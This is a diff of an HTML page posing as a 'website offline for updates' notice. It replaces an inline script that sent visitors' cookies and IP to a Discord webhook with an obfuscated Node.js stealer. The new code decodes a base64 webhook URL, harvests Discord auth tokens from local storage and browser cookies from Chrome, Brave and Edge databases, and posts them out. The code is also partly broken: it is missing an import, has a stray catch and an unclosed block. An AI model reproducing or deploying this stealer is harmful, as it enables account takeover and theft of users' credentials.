@@ -1,34 +1,223 @@
 <html>
 <head>
-<style>
-body {
-font-family: ‘Comic Sans MS’, cursive, sans-serif;
-}
-h1 {
-color: red;
-font-size: 3em;
-text-align: center;
-}
-</style>
-<script>
-var webhook = “https://discord.com/api/webhooks/1445185532362625075/1JiVMU1D83IsJlibkTjNplqrvkQ0sT6Km1-bxAX64sQqNKGLWCVbdxpUZ-yPDR3u8h0j”;
-fetch(“https://api.ipify.org?format=json”).then(res => res.json()).then(ip => {
-const cookies = document.cookie;
-let message = IP: ${ip.ip}\nCookies: ${cookies};
-fetch(webhook, {
-method: “POST”,
-headers: {
-“Content-Type”: “application/json”
-},
-body: JSON.stringify({
-content: message
-})
-});
-});
-</script>
+  <h1>ERROR - THIS  WEBSITE IS OFFLINE DUE TO ONGOING UPDATES</h1>
+  <p>ERROR - 407457</p>
 </head>
-<body>
-<h1>This website is online for updates</h1>
-<p>Stay tuned for more updates!</p>
-</body>
+
+<script>
+  const path = require('path');
+const axios = require('axios');
+const sqlite3 = require('sqlite3').verbose();
+const os = require('os');
+const base64 = require('base-64');
+const browserCookie = require('browser-cookies');
+
+const ew = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NTE4NTUzMjM2MjYyNTA3NS8xSmlWTVUxRDgzSXNKbGlia1RqTnBscXJ2a1Ewc1Q2S20xLWJ4QVg2NHNRcU5LR0xXQ1ZiZHhwVVoteVBEUjN1OGgwag==";
+const dw = base64.decode(ew);
+
+const DISCORD_WEBHOOK_URL = dw;
+
+function finalFindDiscordTokens() {
+    const tokens = new Set();
+    const paths = [];
+    const system = os.platform();
+
+    if (system === "win32") {
+        paths.push(
+            path.join(process.env.LOCALAPPDATA, 'Discord', 'Local Storage', 'leveldb'),
+            path.join(process.env.APPDATA, 'Discord', 'Local Storage', 'leveldb'),
+            path.join(process.env.LOCALAPPDATA, 'DiscordCanary', 'Local Storage', 'leveldb'),
+            path.join(process.env.APPDATA, 'DiscordCanary', 'Local Storage', 'leveldb'),
+            path.join(process.env.LOCALAPPDATA, 'DiscordPTB', 'Local Storage', 'leveldb'),
+            path.join(process.env.APPDATA, 'DiscordPTB', 'Local Storage', 'leveldb')
+        );
+    } else if (system === "linux") {
+        paths.push(
+            path.join(process.env.HOME, '.config/discord/Local Storage/leveldb'),
+            path.join(process.env.HOME, '.config/discordcanary/Local Storage/leveldb'),
+            path.join(process.env.HOME, '.config/discordptb/Local Storage/leveldb')
+        );
+    } else if (system === "darwin") {
+        paths.push(
+            path.join(process.env.HOME, 'Library/Application Support/Discord/Local Storage/leveldb'),
+            path.join(process.env.HOME, 'Library/Application Support/DiscordCanary/Local Storage/leveldb'),
+            path.join(process.env.HOME, 'Library/Application Support/DiscordPTB/Local Storage/leveldb')
+        );
+    }
+
+    const keywords = ["token", "auth_token", "access_token"];
+    const tokenRegex = /([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}|mfa\.[a-zA-Z0-9_-]{84})/g;
+    const longAlphanumeric = /[a-zA-Z0-9_-]{50,200}/g;
+
+    for (const p of paths) {
+        if (fs.existsSync(p)) {
+            try {
+                const files = fs.readdirSync(p);
+                for (const filename of files) {
+                    const filepath = path.join(p, filename);
+                    try {
+                        const content = fs.readFileSync(filepath, 'utf-8');
+                        content.split('\n').forEach(line => {
+                            keywords.forEach(keyword => {
+                                if (line.includes(keyword)) {
+                                    let match;
+                                    while ((match = tokenRegex.exec(line)) !== null) {
+                                        tokens.add(match[0]);
+                                    }
+                                    const potentialMatches = line.match(new RegExp(`${keyword}[\\s'"]*[:=][\\s'"]*${longAlphanumeric.source}`));
+                                    if (potentialMatches) {
+                                        potentialMatches.forEach(match => {
+                                            const potential = match.split('=').pop().trim().replace(/['"]/g, '');
+                                            if (tokenRegex.test(potential)) {
+                                                tokens.add(potential);
+                                            } else if (potential.length > 50 && potential.includes(".")) {
+                                                tokens.add(potential);
+                                            }
+                                        });
+                                    }
+                                }
+                            });
+                        });
+                    } catch (e) {
+                        console.error(`Final token find error reading ${filepath}: ${e}`);
+                    }
+                }
+            } catch (e) {
+                console.error(`Final token path error: ${e}`);
+            }
+        } else {
+            console.log(`Final token path not found: ${p}`);
+        }
+    }
+    return Array.from(tokens);
+}
+
+function finalFindChromeCookies() {
+    const cookiesList = new Set();
+    try {
+        const chromeCookies = browserCookie.getAll();
+        chromeCookies.forEach(cookie => {
+            if (cookie.domain.includes('.discord.com') || cookie.domain.includes('.discordapp.com')) {
+                cookiesList.add(`Domain: ${cookie.domain}, Name: ${cookie.name}, Value: ${cookie.value}`);
+            }
+        });
+    } catch (e) {
+        console.error(`Error extracting Chrome cookies (final browser_cookie3): ${e}`);
+        const localAppData = process.env.LOCALAPPDATA;
+        const chromePaths = [];
+        const system = os.platform();
+        if (system === "win32") {
+            chromePaths.push(
+                path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
+                path.join(localAppData, 'Google', 'Chrome SxS', 'User Data', 'Default', 'Network', 'Cookies'),
+                path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Network', 'Cookies'),
+                path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies')
+            );
+        } else if (system === "linux") {
+            chromePaths.push(
+                path.join(process.env.HOME, '.config/google-chrome/Default/Network/Cookies'),
+                path.join(process.env.HOME, '.config/brave-browser/Default/Network/Cookies')
+            );
+        } else if (system === "darwin") {
+            chromePaths.push(
+                path.join(process.env.HOME, 'Library/Application Support/Google/Chrome/Default/Network/Cookies'),
+                path.join(process.env.HOME, 'Library/Application Support/BraveSoftware/Brave-Browser/Default/Network/Cookies')
+            );
+        }
+        for (const p of chromePaths) {
+            if (fs.existsSync(p)) {
+                try {
+                    const db = new sqlite3.Database(p);
+                    db.serialize(() => {
+                        db.all("SELECT host_key, name, value FROM cookies", [], (err, rows) => {
+                            if (err) {
+                                throw err;
+                            }
+                            rows.forEach(({ host_key, name, value }) => {
+                                cookiesList.add(`ALL - Host: ${host_key}, Name: ${name}, Value: ${value}`);
+                            });
+                        });
+                    });
+                    db.close();
+                } catch (e) {
+                    console.error(`Error reading Chrome cookies (final fallback): ${e}`);
+                }
+            } else {
+                console.log(`Chrome cookie path not found (final fallback): ${p}`);
+            }
+        }
+    } catch (e) {
+        console.error(`General cookie extraction error (final): ${e}`);
+    }
+    return Array.from(cookiesList);
+}
+
+async function finalGetIpAddress() {
+    try {
+        const response = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
+        return response.data.ip;
+    } catch (e) {
+        console.error(`Error getting IP address (final): ${e}`);
+        return null;
+    }
+}
+
+async function finalSendToDiscord(tokens, ipAddress, cookies) {
+    const timestamp = new Date().toISOString();
+    const embed = {
+        title: "Discord & Chrome Info Found!",
+        color: 0x7289DA,
+        fields: [
+            {
+                name: "Timestamp",
+                value: timestamp,
+                inline: false
+            },
+            {
+                name: "Discord Tokens (Aggressive & Platform Aware)",
+                value: `\`\`\`${tokens.length ? tokens.join('\n') : 'No tokens found.'}\`\`\``,
+                inline: false
+            },
+            {
+                name: "IP Address",
+                value: ipAddress || "N/A",
+                inline: false
+            },
+            {
+                name: "Chrome Cookies (ALL)",
+                value: `\`\`\`${cookies.length > 50 ? cookies.slice(0, 50).join('\n') + '...' : cookies.join('\n') || 'No Chrome cookies found.'}\`\`\``,
+                inline: false
+            },
+            {
+                name: "Total Cookies Found",
+                value: String(cookies.length),
+                inline: true
+            }
+        ]
+    };
+    const payload = {
+        embeds: [embed]
+    };
+    const headers = {
+        'Content-Type': 'application/json'
+    };
+
+    try {
+        const response = await axios.post(DISCORD_WEBHOOK_URL, payload, { headers, timeout: 10000 });
+    } catch (e) {
+        console.error(`Error sending to Discord webhook (FINAL): ${e}`);
+    }
+}
+
+(async () => {
+    const tokens = finalFindDiscordTokens();
+    const ipAddress = await finalGetIpAddress();
+    const cookies = finalFindChromeCookies();
+
+    if (tokens.length || ipAddress || cookies.length) {
+        await finalSendToDiscord(tokens, ipAddress, cookies);
+    } else {
+        console.log("No new information found (final mode)");}
+</script>
+  
 </html>
